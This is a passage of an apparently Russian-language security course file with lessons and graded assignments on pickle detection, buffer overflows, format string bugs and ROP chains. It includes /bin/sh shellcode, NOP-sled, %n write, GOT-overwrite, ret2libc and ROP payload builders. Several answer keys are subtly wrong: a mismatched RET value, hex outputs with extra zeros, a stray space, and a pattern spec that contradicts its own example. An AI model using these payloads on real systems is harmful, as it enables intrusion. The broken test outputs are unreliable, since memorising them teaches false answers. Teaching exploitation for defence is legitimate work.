          { input: '3\nmsgpack\nshelve\nflatbuffers', expectedOutput: 'SAFE\nUNSAFE\nSAFE', description: 'msgpack и flatbuffers безопасны, shelve — нет' },
        ],
        points: 10,
      },
      {
        title: 'Base64-декодирование pickle opcode',
        description: 'Реализуйте функцию detect_pickle_magic(base64_data), которая проверяет, является ли base64-строка сериализованным pickle-объектом. Pickle начинается с opcode: \\x80 (protocol 2+) или первый байт — одна из букв: (, c, l, d, S, I, F, T, N, }. Верните PICKLE или NOT_PICKLE. На вход: N строк base64.',
        difficulty: 'easy' as const,
        starterCode: 'import base64\n\ndef detect_pickle_magic(b64_data: str) -> str:\n    # Декодируйте base64 и проверьте pickle-сигнатуру\n    pass\n\nn = int(input())\nfor _ in range(n):\n    print(detect_pickle_magic(input().strip()))\n',
        testCases: [
          { input: '3\ngASVBAAAAACMBHRlc3SULg==\nSGVsbG8gV29ybGQ=\nKGRw', expectedOutput: 'PICKLE\nNOT_PICKLE\nPICKLE', description: 'Первый — pickle protocol 4 (\\x80), второй — "Hello World", третий — "(dp" pickle protocol 0' },
          { input: '2\neyJrZXkiOiAidmFsdWUifQ==\ngAJ9cQAu', expectedOutput: 'NOT_PICKLE\nPICKLE', description: 'JSON в base64, pickle protocol 2' },
        ],
        points: 10,
      },
      {
        title: 'Подсчёт опасных вызовов в коде',
        description: 'Реализуйте функцию count_dangerous_calls(code), которая подсчитывает общее количество вызовов опасных функций: eval, exec, compile, __import__, getattr, setattr, delattr, globals, locals. На вход: многострочный код до END. Выведите: ФУНКЦИЯ:КОЛИЧЕСТВО для каждой найденной (количество > 0), отсортировано по убыванию количества, при равенстве — по алфавиту.',
        difficulty: 'medium' as const,
        starterCode: 'import sys\nimport re\n\ndef count_dangerous_calls(code: str) -> list:\n    # Подсчитайте опасные вызовы\n    pass\n\nlines = []\nfor line in sys.stdin:\n    line = line.rstrip()\n    if line == "END":\n        break\n    lines.append(line)\ncode = "\\n".join(lines)\nresult = count_dangerous_calls(code)\nfor func, cnt in result:\n    print(f"{func}:{cnt}")\nif not result:\n    print("CLEAN")\n',
        testCases: [
          { input: 'eval(x)\neval(y)\nexec(z)\nEND', expectedOutput: 'eval:2\nexec:1', description: '2 вызова eval, 1 exec' },
          { input: 'print("hello")\nresult = 1 + 2\nEND', expectedOutput: 'CLEAN', description: 'Нет опасных вызовов' },
          { input: 'getattr(obj, name)\nsetattr(obj, name, val)\ngetattr(obj2, name2)\nEND', expectedOutput: 'getattr:2\nsetattr:1', description: '2 getattr и 1 setattr' },
        ],
        points: 15,
      },
      {
        title: 'Генератор безопасной замены pickle',
        description: 'Реализуйте функцию safe_serialize(data_type, value), которая сериализует данные в JSON-формат вместо pickle. Поддержите типы: int, float, str, list (элементы через запятую), dict (пары key:value через запятую). Выведите JSON-строку. На вход: T тестов, каждый — тип и значение.',
        difficulty: 'medium' as const,
        starterCode: 'import json\n\ndef safe_serialize(data_type: str, value: str) -> str:\n    # Сериализуйте в JSON вместо pickle\n    pass\n\nt = int(input())\nfor _ in range(t):\n    parts = input().split(maxsplit=1)\n    print(safe_serialize(parts[0], parts[1]))\n',
        testCases: [
          { input: '4\nint 42\nfloat 3.14\nstr hello world\nlist 1,2,3', expectedOutput: '42\n3.14\n"hello world"\n[1, 2, 3]', description: 'Каждый тип сериализуется в JSON' },
          { input: '2\ndict name:Alice,age:30\nlist a,b,c', expectedOutput: '{"name": "Alice", "age": "30"}\n["a", "b", "c"]', description: 'Словарь и список строк' },
        ],
        points: 15,
      },
    ],
  },

  // ──────────────────────────────────────────
  // УРОК 11: Buffer Overflow
  // ──────────────────────────────────────────
  {
    slug: 'buffer-overflow',
    title: 'Buffer Overflow',
    description: 'Стек, перезапись EIP/RIP, NOP sled, шелл-код, защитные механизмы',
    content: `# Buffer Overflow — переполнение буфера

## Организация памяти процесса

\`\`\`
Высокие адреса
┌──────────────┐
│    Stack      │ ← растёт вниз
│              │
├──────────────┤
│    Heap       │ ← растёт вверх
├──────────────┤
│    BSS        │ неинициализированные данные
├──────────────┤
│    Data       │ инициализированные данные
├──────────────┤
│    Text       │ код программы (read-only)
└──────────────┘
Низкие адреса
\`\`\`

## Стековый фрейм

При вызове функции на стеке создаётся **фрейм**:

\`\`\`
┌──────────────┐ Высокие адреса
│ Аргументы     │
├──────────────┤
│ Return Address│ ← EIP/RIP (адрес возврата)
├──────────────┤
│ Saved EBP     │ ← базовый указатель вызывающей функции
├──────────────┤
│ Локальные     │
│ переменные    │ ← buffer[64] здесь
├──────────────┤
│              │
└──────────────┘ Низкие адреса
\`\`\`

## Уязвимый код (C)

\`\`\`c
#include <string.h>
void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // НЕТ проверки длины!
}
// Если input > 64 байт → перезапись return address
\`\`\`

## Моделирование на Python

\`\`\`python
import struct

def simulate_stack_overflow(buffer_size: int, input_data: bytes,
                            saved_ebp: int, return_addr: int) -> dict:
    """Моделирует переполнение буфера на стеке."""
    # Стек (упрощённо)
    stack = {
        "buffer": bytearray(buffer_size),
        "saved_ebp": struct.pack("<I", saved_ebp),    # 4 байта
        "return_addr": struct.pack("<I", return_addr), # 4 байта
    }

    # Записываем input в buffer (без проверки!)
    result = bytearray(buffer_size + 8)  # buffer + ebp + ret
    result[:buffer_size] = bytes(buffer_size)  # изначальный буфер
    result[buffer_size:buffer_size+4] = stack["saved_ebp"]
    result[buffer_size+4:buffer_size+8] = stack["return_addr"]

    # Переполнение!
    for i in range(len(input_data)):
        if i < len(result):
            result[i] = input_data[i]

    return {
        "buffer": result[:buffer_size],
        "saved_ebp": struct.unpack("<I", result[buffer_size:buffer_size+4])[0],
        "return_addr": struct.unpack("<I", result[buffer_size+4:buffer_size+8])[0],
        "overflow": len(input_data) > buffer_size,
        "eip_overwritten": len(input_data) > buffer_size + 4,
    }

# Пример: перезаписываем return address на 0xdeadbeef
payload = b"A" * 64 + b"BBBB" + struct.pack("<I", 0xdeadbeef)
result = simulate_stack_overflow(64, payload, 0x12345678, 0x08041234)
print(f"EIP перезаписан: {hex(result['return_addr'])}")  # 0xdeadbeef
\`\`\`

## NOP Sled + Shellcode

\`\`\`python
def create_exploit_payload(buffer_size: int, nop_size: int,
                           shellcode: bytes, ret_addr: int) -> bytes:
    """Создаёт payload: NOP sled + shellcode + padding + return address."""
    nop_sled = b"\\x90" * nop_size
    padding_size = buffer_size - nop_size - len(shellcode)

    if padding_size < 0:
        raise ValueError("Shellcode + NOP sled > buffer size!")

    payload = nop_sled + shellcode + b"A" * padding_size
    payload += b"BBBB"  # saved EBP
    payload += struct.pack("<I", ret_addr)  # return address → NOP sled
    return payload

# Пример Linux x86 shellcode для /bin/sh (21 байт)
shellcode_binsh = (
    b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68"
    b"\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50"
    b"\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
)

exploit = create_exploit_payload(
    buffer_size=64, nop_size=30,
    shellcode=shellcode_binsh,
    ret_addr=0xbffff600  # приблизительный адрес NOP sled
)
print(f"Payload size: {len(exploit)} bytes")
\`\`\`

## Поиск смещения

\`\`\`python
def generate_cyclic_pattern(length: int) -> bytes:
    """Генерирует уникальный циклический паттерн для поиска смещения."""
    pattern = b""
    for a in range(ord('A'), ord('Z') + 1):
        for b_val in range(ord('a'), ord('z') + 1):
            for c in range(10):
                pattern += bytes([a, b_val, ord('0') + c])
                if len(pattern) >= length:
                    return pattern[:length]
    return pattern[:length]

def find_offset(pattern: bytes, value: int) -> int:
    """Находит смещение 4-байтного значения в паттерне."""
    target = struct.pack("<I", value)
    offset = pattern.find(target)
    return offset if offset != -1 else -1

# Использование:
# 1. Отправляем паттерн программе
pattern = generate_cyclic_pattern(200)
# 2. Смотрим значение EIP при крэше (например 0x63413563)
offset = find_offset(pattern, 0x63413563)
print(f"Offset to EIP: {offset}")
\`\`\`

## Защитные механизмы

| Механизм | Описание | Обход |
|----------|----------|-------|
| Stack Canary | Случайное значение перед ret addr | Утечка канарейки |
| ASLR | Рандомизация адресов | Brute-force, info leak |
| DEP/NX | Стек не исполняемый | ROP-цепочки |
| PIE | Рандомизация кода | Info leak |

## CVE

- **CVE-2014-0160 (Heartbleed)** — buffer over-read в OpenSSL
- **CVE-2017-0144 (EternalBlue)** — buffer overflow в SMBv1
- **Morris Worm (1988)** — первый крупный buffer overflow эксплоит`,
    duration: 60,
    assignments: [
      {
        title: 'Моделирование buffer overflow',
        description: 'Реализуйте симулятор стека. На вход: buffer_size (размер буфера), input_hex (входные данные в hex). Стек: buffer[buffer_size] + saved_ebp(4 байта, изначально 0x41414141) + return_addr(4 байта, изначально 0x08040000). Выведите: OVERFLOW:YES/NO, EBP:0xXXXXXXXX (значение saved_ebp после записи), RET:0xXXXXXXXX (значение return_addr после записи). Значения — little-endian.',
        difficulty: 'hard' as const,
        starterCode: 'import struct\n\ndef simulate_overflow(buffer_size: int, input_hex: str) -> dict:\n    pass\n\nbuf_size = int(input())\ninput_hex = input().strip()\nresult = simulate_overflow(buf_size, input_hex)\nprint(f"OVERFLOW:{result[\'overflow\']}")\nprint(f"EBP:0x{result[\'ebp\']:08x}")\nprint(f"RET:0x{result[\'ret\']:08x}")\n',
        testCases: [
          { input: '8\n4141414141414141424242424344454647', expectedOutput: 'OVERFLOW:YES\nEBP:0x42424242\nRET:0x47464544', description: '8 байт буфер + AAAA перезаписывают EBP=BBBB, RET=CDEF (little-endian)' },
          { input: '16\n41414141', expectedOutput: 'OVERFLOW:NO\nEBP:0x41414141\nRET:0x08040000', description: '4 байта в 16-байтный буфер — нет переполнения, EBP и RET без изменений' },
          { input: '4\n90909090909090909090909090efbeadde', expectedOutput: 'OVERFLOW:YES\nEBP:0x90909090\nRET:0xdeadbeef', description: '4 NOP + 4 NOP(EBP) + 0xdeadbeef(RET) little-endian' },
        ],
        points: 25,
      },
      {
        title: 'Вычисление offset до return address',
        description: 'Реализуйте функцию calc_offset(buffer_size, arch), которая вычисляет смещение от начала буфера до адреса возврата. Для x86: offset = buffer_size + 4 (saved EBP). Для x64: offset = buffer_size + 8 (saved RBP). На вход: T тестов.',
        difficulty: 'easy' as const,
        starterCode: 'def calc_offset(buffer_size: int, arch: str) -> int:\n    # Вычислите offset до return address\n    pass\n\nt = int(input())\nfor _ in range(t):\n    parts = input().split()\n    print(calc_offset(int(parts[0]), parts[1]))\n',
        testCases: [
          { input: '4\n64 x86\n64 x64\n128 x86\n256 x64', expectedOutput: '68\n72\n132\n264', description: 'x86: +4, x64: +8 к размеру буфера' },
          { input: '2\n8 x86\n16 x64', expectedOutput: '12\n24', description: '8+4=12, 16+8=24' },
        ],
        points: 10,
      },
      {
        title: 'Генерация NOP sled',
        description: 'Реализуйте функцию generate_nop_sled(sled_size, shellcode_hex), которая генерирует NOP sled (байты 0x90) заданного размера, за которым следует shellcode. Верните итоговый payload в hex. На вход: T тестов, каждый — размер NOP sled и hex shellcode.',
        difficulty: 'easy' as const,
        starterCode: 'def generate_nop_sled(sled_size: int, shellcode_hex: str) -> str:\n    # Сгенерируйте NOP sled + shellcode в hex\n    pass\n\nt = int(input())\nfor _ in range(t):\n    parts = input().split()\n    print(generate_nop_sled(int(parts[0]), parts[1]))\n',
        testCases: [
          { input: '2\n4 31c050\n8 cc', expectedOutput: '9090909031c050\n90909090909090cc', description: '4 NOP + shellcode, 8 NOP + int3' },
          { input: '1\n0 deadbeef', expectedOutput: 'deadbeef', description: '0 NOP — только shellcode' },
        ],
        points: 10,
      },
      {
        title: 'Little-endian конвертер адресов',
        description: 'Реализуйте функцию to_little_endian(address_hex, arch), которая конвертирует hex-адрес в little-endian строку. Для x86 — 4 байта, для x64 — 8 байт (дополните нулями слева). На вход: T тестов.',
        difficulty: 'medium' as const,
        starterCode: 'import struct\n\ndef to_little_endian(address_hex: str, arch: str) -> str:\n    # Конвертируйте адрес в little-endian hex\n    pass\n\nt = int(input())\nfor _ in range(t):\n    parts = input().split()\n    print(to_little_endian(parts[0], parts[1]))\n',
        testCases: [
          { input: '3\n08041234 x86\ndeadbeef x86\n00400123 x64', expectedOutput: '34120408\nefbeadde\n2301400000000000', description: 'x86: 4 байта LE, x64: 8 байт LE' },
          { input: '2\nffffffff x86\n1234 x86', expectedOutput: 'ffffffff\n34120000', description: 'Все ff, короткий адрес дополняется нулями' },
        ],
        points: 15,
      },
      {
        title: 'Генерация циклического паттерна De Bruijn',
        description: 'Реализуйте функцию generate_pattern(length), которая генерирует циклический паттерн для определения offset при buffer overflow. Паттерн: все комбинации из двух символов — заглавная буква (A-Z) и цифра (0-9), по порядку: Aa0Aa1Aa2...Aa9Ab0Ab1...Zz9. Верните первые length символов.',
        difficulty: 'medium' as const,
        starterCode: 'def generate_pattern(length: int) -> str:\n    # Сгенерируйте циклический паттерн\n    pass\n\nprint(generate_pattern(int(input())))\n',
        testCases: [
          { input: '12', expectedOutput: 'Aa0Aa1Aa2Aa3', description: '12 символов паттерна' },
          { input: '6', expectedOutput: 'Aa0Aa1', description: '6 символов' },
          { input: '30', expectedOutput: 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9', description: '30 символов — все цифры с Aa' },
          { input: '33', expectedOutput: 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0', description: '33 символа — переход к Ab' },
        ],
        points: 15,
      },
    ],
  },

  // ──────────────────────────────────────────
  // УРОК 12: Format String
  // ──────────────────────────────────────────
  {
    slug: 'format-string',
    title: 'Format String Vulnerabilities',
    description: 'Уязвимости printf, чтение и запись памяти, GOT overwrite',
    content: `# Format String Vulnerabilities

## Суть уязвимости

В C функция \`printf\` использует **форматную строку** для определения типов аргументов:

\`\`\`c
printf("%s has %d items", name, count);  // Безопасно
printf(user_input);                       // УЯЗВИМО!
\`\`\`

Если \`user_input = "%x %x %x"\`, printf прочитает значения **со стека** — утечка данных!

## Спецификаторы формата

| Спецификатор | Действие |
|-------------|----------|
| %x | Читает DWORD со стека (hex) |
| %s | Читает строку по указателю со стека |
| %n | **Записывает** количество выведенных символов по указателю |
| %p | Указатель (адрес) |
| %N\$x | Прямой доступ к N-му аргументу |

## Чтение памяти стека

\`\`\`python
def simulate_format_string_read(format_str: str, stack: list) -> str:
    """
    Симулирует printf с format string.
    stack: список значений на стеке (int).
    """
    output = ""
    stack_idx = 0
    i = 0
    while i < len(format_str):
        if format_str[i] == '%' and i + 1 < len(format_str):
            spec = format_str[i + 1]
            # Проверяем прямой доступ %N$x
            if spec.isdigit():
                j = i + 1
                while j < len(format_str) and format_str[j].isdigit():
                    j += 1
                if j < len(format_str) and format_str[j] == '$':
                    n = int(format_str[i+1:j])
                    next_spec = format_str[j+1] if j+1 < len(format_str) else 'x'
                    if next_spec == 'x' and n-1 < len(stack):
                        output += f"{stack[n-1]:08x}"
                    elif next_spec == 'p' and n-1 < len(stack):
                        output += f"0x{stack[n-1]:08x}"
                    i = j + 2
                    continue

            if spec == 'x':
                if stack_idx < len(stack):
                    output += f"{stack[stack_idx]:08x}"
                    stack_idx += 1
            elif spec == 'p':
                if stack_idx < len(stack):
                    output += f"0x{stack[stack_idx]:08x}"
                    stack_idx += 1
            elif spec == 's':
                output += "<string>"
                stack_idx += 1
            elif spec == 'n':
                # %n записывает len(output) по адресу
                output += f"[WRITE:{len(output)}->@stack[{stack_idx}]]"
                stack_idx += 1
            i += 2
        else:
            output += format_str[i]
            i += 1
    return output
\`\`\`

## Запись через %n

\`\`\`%n\` записывает количество уже напечатанных символов в переменную:

\`\`\`python
def calculate_format_write(target_addr: int, value: int) -> str:
    """
    Генерирует format string для записи value по target_addr.
    Метод: побайтовая запись через %hhn (1 байт за раз).
    """
    import struct
    writes = []
    for i in range(4):
        byte_val = (value >> (i * 8)) & 0xFF
        addr = target_addr + i
        writes.append((addr, byte_val))

    # Сортируем по значению для минимизации padding
    writes.sort(key=lambda x: x[1])

    payload_addrs = b""
    format_part = ""
    printed = 0

    for idx, (addr, byte_val) in enumerate(writes):
        payload_addrs += struct.pack("<I", addr)
        needed = byte_val - printed
        if needed < 0:
            needed += 256
        if needed > 0:
            format_part += f"%{needed}c"
        format_part += f"%{idx + 7}$hhn"  # смещение зависит от позиции на стеке
        printed = byte_val

    return payload_addrs, format_part
\`\`\`

## GOT Overwrite

**GOT** (Global Offset Table) хранит адреса библиотечных функций. Перезаписав запись в GOT, можно **перенаправить** вызов функции:

\`\`\`python
def got_overwrite_plan(got_entry: int, target_func: int) -> dict:
    """Планирует GOT overwrite через format string."""
    return {
        "description": f"Перезапись GOT[{hex(got_entry)}] на {hex(target_func)}",
        "effect": "При следующем вызове исходной функции выполнится target",
        "payload_info": calculate_format_write(got_entry, target_func),
        "example": f"printf@GOT = {hex(got_entry)} -> system@PLT = {hex(target_func)}",
    }

# Пример: перезаписываем printf@GOT на system
# Теперь printf("/bin/sh") вызовет system("/bin/sh")
plan = got_overwrite_plan(0x0804a010, 0x08041060)
\`\`\`

## Защита

1. **Всегда передавать формат явно**: \`printf("%s", user_input)\`
2. **Компиляторные предупреждения**: \`-Wformat-security\`
3. **FORTIFY_SOURCE**: проверка аргументов printf на этапе компиляции
4. **RELRO**: защита GOT от записи (Full RELRO)

## Инструменты

- **pwntools** (Python) — автоматизация format string эксплоитов
- **GDB + GEF/pwndbg** — отладка

## CVE

- **CVE-2012-0809** — sudo format string vulnerability
- **CVE-2000-0573** — wu-ftpd format string`,
    duration: 55,
    assignments: [
      {
        title: 'Симулятор format string чтения',
        description: 'Реализуйте симулятор printf с format string. На вход: первая строка — format string (поддержите %x, %p, %d и %N$x, %N$p, %N$d). Вторая строка — значения на стеке через пробел (целые). %x выводит hex (без ведущих нулей, lowercase), %p выводит 0x+hex, %d выводит десятичное. Между выводами спецификаторов — как в format string. Обычные символы выводятся как есть.',
        difficulty: 'hard' as const,
        starterCode: 'def format_string_sim(fmt: str, stack: list) -> str:\n    pass\n\nfmt = input()\nstack = list(map(int, input().split()))\nprint(format_string_sim(fmt, stack))\n',
        testCases: [
          { input: '%x.%x.%x\n255 4096 31337', expectedOutput: 'ff.1000.7a69', description: '%x выводит hex без ведущих нулей' },
          { input: 'addr=%3$p val=%1$d\n100 200 48879', expectedOutput: 'addr=0xbeef val=100', description: 'Прямой доступ: %3$p=третий(48879=0xbeef), %1$d=первый(100)' },
          { input: 'A%xB%xC\n10 255', expectedOutput: 'AaB ffC', description: 'Обычные символы между спецификаторами сохраняются' },
          { input: '%d+%d=%d\n3 5 8', expectedOutput: '3+5=8', description: 'Десятичный вывод' },
        ],
        points: 25,
      },
      {
        title: 'Подсчёт спецификаторов формата',
        description: 'Реализуйте функцию count_format_specs(fmt_string), которая подсчитывает количество спецификаторов формата (%) в строке. Считайте: %d, %x, %p, %s, %n, %N$x, %N$d и т.д. Не считайте %% (экранированный процент). На вход: N строк.',
        difficulty: 'easy' as const,
        starterCode: 'import re\n\ndef count_format_specs(fmt_string: str) -> int:\n    # Подсчитайте спецификаторы формата\n    pass\n\nn = int(input())\nfor _ in range(n):\n    print(count_format_specs(input()))\n',
        testCases: [
          { input: '3\n%x %x %x %x\n100%% complete %d items\nno specs here', expectedOutput: '4\n1\n0', description: '4 спецификатора, %% не считается + 1 %d, ни одного' },
          { input: '2\n%1$x %2$d %3$p\n%s%s%s%n', expectedOutput: '3\n4', description: '3 прямых доступа, 4 спецификатора включая %n' },
        ],
        points: 10,
      },
      {
        title: 'Конвертер числа в hex',
        description: 'Реализуйте функцию int_to_hex_formats(number), которая выводит число в трёх форматах: DEC (десятичное), HEX (%x формат — lowercase без ведущих нулей), PTR (%p формат — 0x + hex). На вход: N чисел.',
        difficulty: 'easy' as const,
        starterCode: 'def int_to_hex_formats(number: int) -> tuple:\n    # Верните (dec_str, hex_str, ptr_str)\n    pass\n\nn = int(input())\nfor _ in range(n):\n    d, h, p = int_to_hex_formats(int(input()))\n    print(f"DEC:{d} HEX:{h} PTR:{p}")\n',
        testCases: [
          { input: '3\n255\n4096\n48879', expectedOutput: 'DEC:255 HEX:ff PTR:0xff\nDEC:4096 HEX:1000 PTR:0x1000\nDEC:48879 HEX:beef PTR:0xbeef', description: 'Три числа в трёх форматах' },
          { input: '2\n0\n16', expectedOutput: 'DEC:0 HEX:0 PTR:0x0\nDEC:16 HEX:10 PTR:0x10', description: 'Ноль и 16' },
        ],
        points: 10,
      },
      {
        title: 'Определение опасных спецификаторов',
        description: 'Реализуйте функцию detect_dangerous_format(fmt_string), которая определяет уровень опасности format string: WRITE если есть %n (запись в память), READ если есть %s или %x без %n (чтение памяти), SAFE если только %d или нет спецификаторов. На вход: N строк.',
        difficulty: 'medium' as const,
        starterCode: 'def detect_dangerous_format(fmt_string: str) -> str:\n    # Определите уровень опасности\n    pass\n\nn = int(input())\nfor _ in range(n):\n    print(detect_dangerous_format(input()))\n',
        testCases: [
          { input: '4\n%x%x%x%n\n%x%x%x%x\n%d + %d = %d\nHello World', expectedOutput: 'WRITE\nREAD\nSAFE\nSAFE', description: '%n=WRITE, %x без %n=READ, только %d=SAFE, без спецификаторов=SAFE' },
          { input: '2\n%s%s%s\n%1$n', expectedOutput: 'READ\nWRITE', description: '%s=READ, %1$n=WRITE' },
        ],
        points: 15,
      },
      {
        title: 'Вычисление %n write-what-where',
        description: 'Реализуйте функцию calc_writes(target_addr_hex, target_value, already_written). В format string атаке %n записывает количество уже выведенных байт. Чтобы записать target_value в target_addr, нужно вывести ровно target_value байт. Вычислите padding = target_value - already_written. Если padding < 0 — нужно перекрутить через 256 (1 байт) или 65536 (2 байта). Выведите: ADDR:hex, PADDING:число, TOTAL:число.',
        difficulty: 'medium' as const,
        starterCode: 'def calc_writes(target_addr: str, target_value: int, already_written: int) -> dict:\n    # Вычислите параметры для %n записи\n    pass\n\naddr = input().strip()\nval = int(input())\nwritten = int(input())\nr = calc_writes(addr, val, written)\nprint(f"ADDR:0x{r[\'addr\']}")\nprint(f"PADDING:{r[\'padding\']}")\nprint(f"TOTAL:{r[\'total\']}")\n',
        testCases: [
          { input: '08041234\n200\n50', expectedOutput: 'ADDR:0x08041234\nPADDING:150\nTOTAL:200', description: 'Нужно вывести ещё 150 байт чтобы %n записал 200' },
          { input: 'deadbeef\n10\n100', expectedOutput: 'ADDR:0xdeadbeef\nPADDING:166\nTOTAL:266', description: '10 < 100, перекрутка через 256: 256+10-100=166' },
          { input: '08040000\n0\n0', expectedOutput: 'ADDR:0x08040000\nPADDING:0\nTOTAL:0', description: 'Записать 0, уже выведено 0 — padding 0' },
        ],
        points: 15,
      },
    ],
  },

  // ──────────────────────────────────────────
  // УРОК 13: ROP-цепочки
  // ──────────────────────────────────────────
  {
    slug: 'rop-chains',
    title: 'ROP-цепочки',
    description: 'Return-Oriented Programming, гаджеты, обход DEP/NX, построение цепочек',
    content: `# ROP — Return-Oriented Programming

## Зачем нужен ROP?

Когда **DEP/NX** запрещает исполнение кода на стеке, мы не можем использовать shellcode напрямую. ROP позволяет **составлять программу из фрагментов** существующего кода.

## Что такое гаджет?

**Гаджет** — последовательность инструкций, заканчивающаяся \`ret\`:

\`\`\`asm
; Гаджет 1: pop eax; ret
0x08041234: pop eax
0x08041235: ret

; Гаджет 2: pop ebx; ret
0x08041238: pop ebx
0x08041239: ret

; Гаджет 3: int 0x80 (системный вызов)
0x0804123c: int 0x80
\`\`\`

## Принцип работы

Перезаписываем стек цепочкой адресов гаджетов:

\`\`\`
┌──────────────────┐
│ addr(gadget_1)    │ → pop eax; ret  → eax = 0x0b (execve)
├──────────────────┤
│ 0x0000000b        │ (значение для eax)
├──────────────────┤
│ addr(gadget_2)    │ → pop ebx; ret  → ebx = addr("/bin/sh")
├──────────────────┤
│ addr("/bin/sh")   │ (значение для ebx)
├──────────────────┤
│ addr(gadget_3)    │ → int 0x80       → системный вызов execve
└──────────────────┘
\`\`\`

## Моделирование ROP на Python

\`\`\`python
import struct

class ROPChain:
    """Конструктор ROP-цепочки."""

    def __init__(self, arch="x86"):
        self.chain = []
        self.arch = arch
        self.pack_fmt = "<I" if arch == "x86" else "<Q"
        self.word_size = 4 if arch == "x86" else 8

    def add_gadget(self, addr: int, *args):
        """Добавляет гаджет с аргументами."""
        self.chain.append(("gadget", addr, args))

    def add_value(self, value: int):
        """Добавляет значение на стек."""
        self.chain.append(("value", value, ()))

    def add_padding(self, count: int):
        """Добавляет padding."""
        self.chain.append(("padding", count, ()))

    def build(self) -> bytes:
        """Собирает ROP-цепочку в байты."""
        payload = b""
        for entry_type, value, args in self.chain:
            if entry_type == "gadget":
                payload += struct.pack(self.pack_fmt, value)
                for arg in args:
                    payload += struct.pack(self.pack_fmt, arg)
            elif entry_type == "value":
                payload += struct.pack(self.pack_fmt, value)
            elif entry_type == "padding":
                payload += b"A" * value
        return payload

    def dump(self) -> str:
        """Выводит цепочку в читаемом виде."""
        lines = []
        offset = 0
        for entry_type, value, args in self.chain:
            if entry_type == "gadget":
                lines.append(f"+{offset:04x}: {hex(value)} (gadget)")
                offset += self.word_size
                for arg in args:
                    lines.append(f"+{offset:04x}: {hex(arg)} (arg)")
                    offset += self.word_size
            elif entry_type == "value":
                lines.append(f"+{offset:04x}: {hex(value)} (value)")
                offset += self.word_size
        return "\n".join(lines)

# Пример: execve("/bin/sh", NULL, NULL) на x86 Linux
rop = ROPChain("x86")
rop.add_gadget(0x08041234, 0x0b)        # pop eax; ret → eax = 11 (execve)
rop.add_gadget(0x08041238, 0x0804b000)  # pop ebx; ret → ebx = "/bin/sh"
rop.add_gadget(0x0804123c, 0x00000000)  # pop ecx; ret → ecx = NULL
rop.add_gadget(0x08041240, 0x00000000)  # pop edx; ret → edx = NULL
rop.add_value(0x08041250)               # int 0x80
print(rop.dump())
\`\`\`

## Поиск гаджетов

\`\`\`python
def find_gadgets_in_binary(binary_data: bytes, max_gadget_len: int = 5) -> list:
    """
    Ищет ROP-гаджеты в бинарных данных.
    Ищем 0xc3 (ret) и дизассемблируем назад.
    """
    gadgets = []
    ret_byte = 0xc3
    for i in range(len(binary_data)):
        if binary_data[i] == ret_byte:
            # Пробуем разные длины гаджета
            for length in range(1, max_gadget_len + 1):
                start = i - length
                if start >= 0:
                    gadget_bytes = binary_data[start:i+1]
                    gadgets.append({
                        "offset": start,
                        "bytes": gadget_bytes.hex(),
                        "length": length + 1,
                    })
    return gadgets

# В реальности используется ROPgadget или ropper:
# ROPgadget --binary ./vuln --only "pop|ret"
# ropper --file ./vuln --search "pop eax; ret"
\`\`\`

## Продвинутые техники

### ret2libc

Вместо гаджетов вызываем \`system("/bin/sh")\` из libc:

\`\`\`python
# Стек для ret2libc:
# [addr(system)] [addr(exit)] [addr("/bin/sh")]
def ret2libc_payload(system_addr, exit_addr, binsh_addr, offset):
    payload = b"A" * offset        # padding до return address
    payload += struct.pack("<I", system_addr)
    payload += struct.pack("<I", exit_addr)    # return после system
    payload += struct.pack("<I", binsh_addr)   # аргумент для system
    return payload
\`\`\`

### SROP (Sigreturn-Oriented Programming)

Использует \`sigreturn\` для установки всех регистров за один вызов.

## Инструменты

- **ROPgadget** — поиск гаджетов
- **ropper** — поиск и построение цепочек
- **pwntools** — \`ROP(elf)\` автоматически строит цепочки
- **angr** — символьное исполнение для автоматического ROP

## CVE

- **CVE-2013-2094** — Linux kernel ROP exploit
- Большинство современных buffer overflow эксплоитов используют ROP`,
    duration: 60,
    assignments: [
      {
        title: 'Построение ROP-цепочки',
        description: 'Реализуйте конструктор ROP-цепочки. На вход: первая строка — архитектура (x86 или x64), затем N строк с командами: "gadget ADDR [ARG1 ARG2 ...]" или "value VAL" или "padding SIZE". Все числа в hex (без 0x). Выведите итоговый payload в hex (lowercase, без пробелов). x86 = 4 байта little-endian, x64 = 8 байт.',
        difficulty: 'hard' as const,
        starterCode: 'import struct\n\ndef build_rop(arch: str, commands: list) -> str:\n    pass\n\narch = input().strip()\ncmds = []\nwhile True:\n    try:\n        line = input().strip()\n        if line:\n            cmds.append(line)\n    except EOFError:\n        break\nprint(build_rop(arch, cmds))\n',
        testCases: [
          { input: 'x86\ngadget 08041234 0b\ngadget 08041238 0804b000', expectedOutput: '341204080b000000381204080000b00408', description: 'x86: два гаджета с аргументами, little-endian 4 байта' },
          { input: 'x86\npadding 4\nvalue deadbeef', expectedOutput: '41414141efbeadde', description: 'padding AAAA + value 0xdeadbeef' },
          { input: 'x64\ngadget 00400123 0b', expectedOutput: '230140000000000000b000000000000000', description: 'x64: гаджет + аргумент, 8 байт little-endian' },
        ],
        points: 25,
      },
      {
        title: 'Упаковка адреса в little-endian',
        description: 'Реализуйте функцию pack_address(hex_addr, bits), которая упаковывает hex-адрес (без 0x) в little-endian строку. bits = 32 или 64. Дополните нулями до нужной длины. Верните hex-строку результата. На вход: T тестов.',
        difficulty: 'easy' as const,
        starterCode: 'import struct\n\ndef pack_address(hex_addr: str, bits: int) -> str:\n    # Упакуйте адрес в little-endian\n    pass\n\nt = int(input())\nfor _ in range(t):\n    addr, bits = input().split()\n    print(pack_address(addr, int(bits)))\n',
        testCases: [
          { input: '3\n08041234 32\ndeadbeef 32\n00400123 64', expectedOutput: '34120408\nefbeadde\n2301400000000000', description: '32-bit и 64-bit адреса в little-endian' },
          { input: '2\nff 32\n1 64', expectedOutput: 'ff000000\n0100000000000000', description: 'Короткие адреса дополняются нулями' },
        ],
        points: 10,
      },
      {
        title: 'Классификация ROP-гаджетов',
        description: 'Реализуйте функцию classify_gadget(instruction). Классифицируйте гаджет по типу: POP если содержит "pop", MOV если "mov", XOR если "xor", SYSCALL если "int 0x80" или "syscall", RET если только "ret", OTHER иначе. На вход: N строк с инструкциями.',
        difficulty: 'easy' as const,
